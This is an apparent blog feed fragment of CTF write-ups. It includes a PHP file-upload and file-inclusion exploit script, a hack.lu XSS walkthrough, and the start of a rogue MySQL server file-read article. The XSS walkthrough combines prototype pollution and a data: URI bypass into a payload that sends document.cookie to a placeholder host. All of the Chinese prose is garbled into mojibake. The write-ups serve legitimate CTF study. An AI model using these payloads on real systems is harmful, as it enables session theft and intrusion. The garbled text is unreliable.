class="string">"&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#53;&amp;#55;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#102;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#100;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#100;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#53;&amp;#52;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#102;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#53;&amp;#102;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#51;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#52;&amp;#51;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;"</span></span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> urldecode(html_entity_decode($encryptText));</span><br><span class="line">\u0057\u0065\u006c\u0063\u006f\u006d\u0065\u002d\u0054\u006f\u005f\u0033\u0043\u0074\u0066</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-8.png" alt="upload successful"></p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>è®¿é—®<a href="http://examination.cup.360.cn:9004/.git" target="_blank" rel="noopener">http://examination.cup.360.cn:9004/.git</a> ï¼Œå‘ç°403ï¼Œåˆ¤æ–­ä¸ºgitæ³„éœ²ï¼Œä½¿ç”¨GitHack.py dumpä¸‹æ¥æºç ï¼Œå‘ç°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸‹é¢æ˜¯åˆ©ç”¨ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post, get</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://examination.cup.360.cn:9002/upload.php"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">"face"</span>:(<span class="string">'test.jpg'</span>, <span class="string">b'&lt;?php echo system("cat 739d3f54_flag.php");'</span>)&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"37ed358aaf35c9508dfb1b715b3c01ab"</span>&#125;</span><br><span class="line"></span><br><span class="line">res = post(url, files=files, cookies=cookies)</span><br><span class="line">print(res.content)</span><br><span class="line">filename = res.content.decode(<span class="string">'utf-8'</span>)[<span class="number">-36</span>:]</span><br><span class="line">print(filename)</span><br><span class="line"></span><br><span class="line">path = <span class="string">'showimage.php?/../ac78b24a/'</span> + filename</span><br><span class="line">params = &#123;<span class="string">"file"</span>:path&#125;</span><br><span class="line">res = get(<span class="string">"http://examination.cup.360.cn:9002/include.php"</span>, params=params, cookies=cookies)</span><br><span class="line">print(res.content.decode())</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ç­¾åˆ°é¢˜&quot;&gt;&lt;a href=&quot;#ç­¾åˆ°é¢˜&quot; class=&quot;headerlink&quot; title=&quot;ç­¾åˆ°é¢˜&quot;&gt;&lt;/a&gt;ç­¾åˆ°é¢˜&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#53;&amp;amp;#55;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#53;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#99;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#51;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#102;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#100;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#53;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#50;&amp;amp;#100;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#53;&amp;amp;#52;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#102;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#53;&amp;amp;#102;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#51;&amp;amp;#51;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#52;&amp;amp;#51;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#55;&amp;amp;#52;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#54;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://lcark.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>hack.lu ctf-Car Repair Shop(xss, prototype pollution, bypass) </title>
    <link href="https://lcark.github.io/2019/10/26/hack-lu-ctf-Car-Repair-Shop/"/>
    <id>https://lcark.github.io/2019/10/26/hack-lu-ctf-Car-Repair-Shop/</id>
    <published>2019-10-26T15:57:00.000Z</published>
    <updated>2019-10-27T09:57:18.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>â€œYour Car broke down?! Come to our shop, we repair all cars! Even very old ones.â€ <a href="https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ç‚¹å¼€é¢˜ç›®ï¼Œå³ä¸‹è§’æœ‰ä¸ªæ˜æ˜¾çš„é“¾æ¥<code>get your cookie</code>, æ˜¯ä¸€ä¸ªæäº¤é“¾æ¥çš„ç•Œé¢</p><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>æ˜¾ç„¶æ˜¯dom-based xss<br><br>ä»¥ä¸‹æ˜¯å…³é”®ä»£ç <br><br>car.class.js</p><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"> â€¦â€¦</span><br><span class="line">    repair() &#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'repair'</span>)) &#123;</span><br><span class="line">            $.extend(<span class="literal">true</span>, <span class="keyword">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">'repair'</span>)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ignition() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">""</span>) &#123;</span><br><span class="line">            infobox(<span class="string">`Looks like the key got lost. No wonder the car is not starting ...`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">"ğŸ”‘"</span>) &#123;</span><br><span class="line">            infobox(<span class="string">`The car started!`</span>)</span><br><span class="line">            <span class="keyword">this</span>.start()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>util.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line">porsche.repair = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">'9cdfb439c7876e703e307864c9167a15'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'help'</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">'help'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> autoStart = <span class="function">(<span class="params">car</span>) =&gt;</span> &#123;</span><br><span class="line">    car.repair()</span><br><span class="line">    car.ignition()</span><br><span class="line">    car.powerOn()</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Bugatti'</span>))</span><br><span class="line">        autoStart(bugatti)</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Porsche'</span>))</span><br><span class="line">        autoStart(porsche)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">'head'</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦é€šè¿‡<code>autoStart</code>ä¿®å¤<code>bugatti</code>å’Œ<code>porsche</code>è¿™ä¸¤è¾†è½¦æ¥æ‰§è¡Œ<br><code>repairWithHelper</code>å‡½æ•°ä»¥æ­¤æ¥è§¦å‘xssï¼Œæˆ‘ä»¬éœ€è¦è§£å†³ä»¥ä¸‹é—®é¢˜</p><ol><li>ç»•è¿‡ key == â€œğŸ”‘â€æ¥å¯åŠ¨ <code>bugatti</code></li><li>ç»•è¿‡ $.md5(porsche) == â€˜9cdfb439c7876e703e307864c9167a15â€™æ¥æ‰§è¡Œ<code>repairWithHelper</code>å‡½æ•°</li><li>ç»•è¿‡<code>repairWithHelper</code>å‡½æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ‰§è¡Œjs<br></li></ol><p>è¦è§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å‘ç°äº†å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">repair() &#123;</span><br><span class="line">    <span class="keyword">if</span>(urlParams.has(<span class="string">'repair'</span>)) &#123;</span><br><span class="line">        $.extend(<span class="literal">true</span>, <span class="keyword">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">'repair'</span>)))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯<code>jQuery</code>å®˜æ–¹å¯¹<code>extend</code>å‡½æ•°çš„å®šä¹‰ï¼š<br><img src="/images/pasted-1.png" alt="upload successful"><br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨<code>url</code>ä¸­æ·»åŠ <code>repair</code>å‚æ•°æ¥è§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜:<br><code>https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;}#BugattiPorsche</code></p><p>ç¬¬äºŒä¸ªé—®é¢˜ä¼¼ä¹å°±æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæˆ‘ä»¬è¦ä½¿<code>porsch</code>çš„md5ä¸º<code>9cdfb439c7876e703e307864c9167a15</code>,å®é™…ä¸Šå°±æ˜¯<code>lol</code>çš„md5å€¼ï¼Œæˆ‘ä»¬ä¸å¦¨ç›´æ¥è®¡ç®—<code>porsche</code>çš„md5</p><p><img src="/images/pasted-2.png" alt="upload successful"><br>å‘ç°å…¶md5ä¸º<code>[object Object]</code>çš„md5ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ<br>å®é™…ä¸Šè°ƒç”¨md5å‡½æ•°ä¹‹å‰ä¼šè°ƒç”¨<code>toString</code>æ–¹æ³•ï¼Œè€Œ<code>porsche</code>åˆç»§æ‰¿äº<code>Object</code>ç±»ï¼Œæˆ‘ä»¬ä¸å¦¨æ”¹å†™æ­¤æ–¹æ³•<br><img src="/images/pasted-3.png" alt="upload successful"><br>å’Œæˆ‘ä»¬æ–™æƒ³çš„ä¸€æ¨¡ä¸€æ ·ï¼Œå› æ­¤å¯ä»¥æ”¹å†™<code>porsche</code>çš„<code>toString</code>æ–¹æ³•æ¥ç»•è¿‡ï¼Œç„¶è€Œ<code>JSON.parse</code>å¹¶ä¸æ”¯æŒæ–¹æ³•çš„è§£æï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ<br>æˆ‘ä»¬å°±ä¸å¾—ä¸äº†è§£ä¸€ä¸‹jsä¸­çš„<code>prototype</code>ï¼Œä»€ä¹ˆæ˜¯åŸå‹å‘¢ï¼Ÿ<br>å¼•ç”¨ã€ŠJavaScriptæƒå¨æŒ‡å—ã€‹çš„ä¸€æ®µæè¿°ï¼š</p><blockquote><p>Every JavaScript object has a second JavaScript object (or null ,but this is rare) associated with it. This second object is known as a prototype, and the first object inherits properties from the prototype.</p></blockquote><p>æ„æ€å°±æ˜¯åŸºæœ¬ä¸Šæ¯ä¸ªjså¯¹è±¡éƒ½æœ‰ä¸€ä¸ªç¬¬äºŒå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯åŸå‹ï¼Œç¬¬ä¸€å¯¹è±¡çš„æ‰€æœ‰å±æ€§éƒ½ç»§æ‰¿äºåŸå‹ã€‚</p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œå®ƒé¦–å…ˆä¼šä»å½“å‰å¯¹è±¡æ‰€å®šä¹‰çš„å±æ€§å’Œå¯¹è±¡å¯»æ‰¾ï¼Œè‹¥æ˜¯æ²¡æœ‰ï¼Œåˆ™ä»æ‰€ç»§æ‰¿çš„å¯¹è±¡å¯»æ‰¾å³ä»<code>__proto__</code>å¯»æ‰¾ï¼Œè‹¥è¿˜æ˜¯æ²¡æœ‰ï¼Œåˆ™ç»§ç»­ä»<code>__proto__.proto__</code>å¯»æ‰¾ï¼Œç›´è‡³æœ€åã€‚ç®€è€Œè¨€ä¹‹ï¼Œ<code>__proto__</code>æ‰€ä»£è¡¨çš„å°±æ˜¯æ‰€ç»§æ‰¿å¯¹è±¡çš„åŸå‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™ä¸ª<code>__proto__</code>æ¥è¾¾åˆ°ä¿®æ”¹çˆ¶ç±»å±æ€§æˆ–æ–¹æ³•çš„ç›®çš„ï¼Œç”šè‡³ç›´æ¥ä¿®æ”¹å®ƒçš„çˆ¶ç±»ã€‚</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>é‚£ä¹ˆç¬¬äºŒä¸ªé—®é¢˜å°±è¿åˆƒè€Œè§£ï¼Œæˆ‘ä»¬å°†<code>porsche</code>çš„çˆ¶ç±»çš„çˆ¶ç±»æ”¹ä¸º<code>[&#39;lol&#39;]</code>ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨<code>toString</code>è¿”å›<code>lol</code>æ¥ç»•è¿‡<code>md5</code>æ£€æµ‹ã€‚</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p><code>payload: repair={&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p><p>ç¬¬ä¸‰ä¸ªé—®é¢˜æˆ‘ä»¬éœ€è¦ç»•è¿‡<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿™ä¸ªæˆ‘ä»¬ç”¨<code>data</code>åè®®ç»•è¿‡å³å¯ï¼š<br><br><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>OKï¼ä»¥ä¸‹æ˜¯å®Œæ•´payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:[&quot;lol&quot;]&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/a/,$.get(&apos;[your-url]&apos;+document.cookie)//.js#Bugatti%20Porsche</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><ol><li>ä½¿ç”¨extendç»•è¿‡keyçš„æ£€æµ‹</li><li>æ›¿æ¢<code>porsche</code>çš„çˆ¶ç±»æ¥ç»•è¿‡md5</li><li>ä½¿ç”¨dataåè®®ç»•è¿‡srcçš„æ­£åˆ™è¡¨è¾¾å¼</li></ol><h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><ol><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></li><li><a href="https://github.com/creeperyang/blog/issues/9" target="_blank" rel="noopener">https://github.com/creeperyang/blog/issues/9</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;a href=&quot;#é¢˜ç›®æè¿°&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;/a&gt;é¢˜ç›®æè¿°&lt;/h2&gt;&lt;p&gt;â€œYour Car broke down?! Come to our shop, we repair all cars! Even very old ones.â€ &lt;a href=&quot;https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ä¼ é€é—¨&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;/a&gt;é¢˜ç›®åˆ†æ&lt;/h2&gt;&lt;p&gt;ç‚¹å¼€é¢˜ç›®ï¼Œå³ä¸‹è§’æœ‰ä¸ªæ˜æ˜¾çš„é“¾æ¥&lt;code&gt;get your cookie&lt;/code&gt;, æ˜¯ä¸€ä¸ªæäº¤é“¾æ¥çš„ç•Œé¢&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-0.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;&lt;p&gt;æ˜¾ç„¶æ˜¯dom-based xss&lt;br&gt;&lt;br&gt;ä»¥ä¸‹æ˜¯å…³é”®ä»£ç &lt;br&gt;&lt;br&gt;car.class.js&lt;/p&gt;
    
    </summary>
    
    
      <category term="web security" scheme="https://lcark.github.io/categories/web-security/"/>
    
    
      <category term="ctf" scheme="https://lcark.github.io/tags/ctf/"/>
    
      <category term="xss" scheme="https://lcark.github.io/tags/xss/"/>
    
      <category term="prototype pollution" scheme="https://lcark.github.io/tags/prototype-pollution/"/>
    
  </entry>
  
  <entry>
    <title>MysqlClientAttack</title>
    <link href="https://lcark.github.io/2019/09/24/tags/"/>
    <id>https://lcark.github.io/2019/09/24/tags/</id>
    <published>2019-09-24T13:06:00.000Z</published>
    <updated>2019-10-12T09:02:46.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="#æ¼æ´åˆ†æ"></a>#æ¼æ´åˆ†æ</h2><p>åœ¨mysqlä¸­å¯ä»¥é€šè¿‡<code>load data local infile &quot;/var/lib/mysql-files/test.txt&quot; into table test</code>å‘½ä»¤ï¼Œå°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ è‡³MySQLæœåŠ¡å™¨ï¼Œå®é™…ä¸Šï¼ŒæœåŠ¡å™¨å¯ä»¥ç›´æ¥å‘å‡ºè¯·æ±‚æ¥è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦ç»è¿‡ç”¨æˆ·åŒæ„ã€‚</p><a id="more"></a><h2 id="æŠ“åŒ…åˆ†æ"><a href="#æŠ“åŒ…åˆ†æ" class="headerlink" title="æŠ“åŒ…åˆ†æ"></a>æŠ“åŒ…åˆ†æ</h2><p>å®¢æˆ·ç«¯å‘å‡ºå‘½ä»¤è¯·æ±‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223700-eef63dc0-dfa1-1.png" alt="image.png"><br>æœåŠ¡ç«¯å‘å‡ºè¯»å–æ–‡ä»¶è¯·æ±‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223739-064eca3c-dfa2-1.png" alt="image.png"><br>å®¢æˆ·ç«¯å‘é€æ–‡ä»¶<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223903-381ed7fa-dfa2-1.png" alt="image.png"><br>è‹¥æ˜¯æœåŠ¡ç«¯ç›´æ¥å‘å‡ºè¯»å–æ–‡ä»¶è¯·æ±‚ï¼Œå®¢æˆ·ç«¯ä¾¿ä¼šç›´æ¥å‘é€æœ¬åœ°æ–‡ä»¶ã€‚</p><h1 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h1><hr><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨<br>æœåŠ¡å™¨å‘é€GreetingåŒ…ï¼Œè¦æ±‚å®¢æˆ·ç«¯æä¾›å¯†ç <br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224231-b40f5178-dfa2-1.png" alt="image.png"><br>å®¢æˆ·ç«¯å‘é€ç™»é™†è¯·æ±‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224419-f4effe22-dfa2-1.png" alt="image.png"><br>æœåŠ¡ç«¯ç›´æ¥å‘å‡ºokï¼Œç„¶åæœåŠ¡ç«¯ç›´æ¥å‘å‡ºè¯»å–æ–‡ä»¶è¯·æ±‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224712-5ba065da-dfa3-1.png" alt="image.png"><br>å®¢æˆ·ç«¯ä¾¿ä¼šç›´æ¥å‘é€æœ¬åœ°æ–‡ä»¶ã€‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224744-6ee9ec1a-dfa3-1.png" alt="image.png"></p><h1 id="æ”»å‡»æ€»è§ˆ"><a href="#æ”»å‡»æ€»è§ˆ" class="headerlink" title="æ”»å‡»æ€»è§ˆ"></a>æ”»å‡»æ€»è§ˆ</h1><hr><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225550-908cd930-dfa4-1.png" alt="image.png"><br>æ³¨æ„ä¸­é—´çš„query requestæ˜¯æ¯æ¬¡ç™»é™†æˆåŠŸçš„ç‰ˆæœ¬å·æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¹¶æœªå“åº”<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225737-d06485e4-dfa4-1.png" alt="image.png"></p><h1 id="è‡ªåŠ¨åŒ–å·¥å…·"><a href="#è‡ªåŠ¨åŒ–å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–å·¥å…·"></a>è‡ªåŠ¨åŒ–å·¥å…·</h1><hr><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225915-0aaf8730-dfa5-1.png" alt="image.png"><br>è¯¦è§ <a href="https://github.com/lcark/MysqlClientAttack/" target="_blank" rel="noopener">https://github.com/lcark/MysqlClientAttack/</a></p><h1 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h1><hr><p>è¿è¡Œè„šæœ¬ï¼Œç›‘å¬æœ¬åœ°ç«¯å£<br><img 